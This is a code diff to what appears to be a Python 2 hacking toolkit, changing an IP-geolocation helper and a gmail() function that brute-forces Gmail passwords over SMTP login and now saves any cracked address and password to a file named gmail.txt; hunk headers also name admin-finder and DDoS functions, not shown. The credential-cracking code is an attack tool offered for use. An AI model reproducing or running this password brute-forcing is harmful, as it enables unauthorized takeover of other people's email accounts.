@@ -100,7 +100,8 @@ def findAdminWIN():
 def iplocate():
     print ga.red
     while True:
-	ip1=raw_input("IP Address: ")
+	print "Leave It Empty To Check Your IP"
+	ip1 = raw_input("IP: ")
 	url = "http://ip-api.com/json/"
 	response = urllib2.urlopen(url + ip1)
 	data = response.read()
@@ -117,9 +118,6 @@ def iplocate():
 	print(" ZIPCODE: " + values['zip'])
 	print(" TimeZone: " + values['timezone'])
 	print(" AS: " + values['as'])
-	print "\n"
-	print ga.yellow
-	print "Thanks For Using My Tool :D"
 	exit()
               
 def DDoS():
@@ -266,13 +264,27 @@ def gmail():
       try:
          server.login(user_name, password)
          print '\n'
-         print '[+] Account Hacked - Password ---> ', password
+         print "Account hacked password is on gmail.txt"
+         f = open("gmail.txt", "w")
+         f.write("gmail: ")
+         f.write(gmail)
+         f.write("\n")
+         f.write("password: ")
+	 f.write(password)
+         f.close()
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
-            print '[+] Account Hacked Password ---> ', password
+            print "Account hacked password is on gmail.txt"
+            f = open("gmail.txt", "w")
+            f.write("gmail: ")
+            f.write(gmail)
+            f.write("\n")
+            f.write("password: ")
+            f.write(password)
+            f.close()
 
             break
          
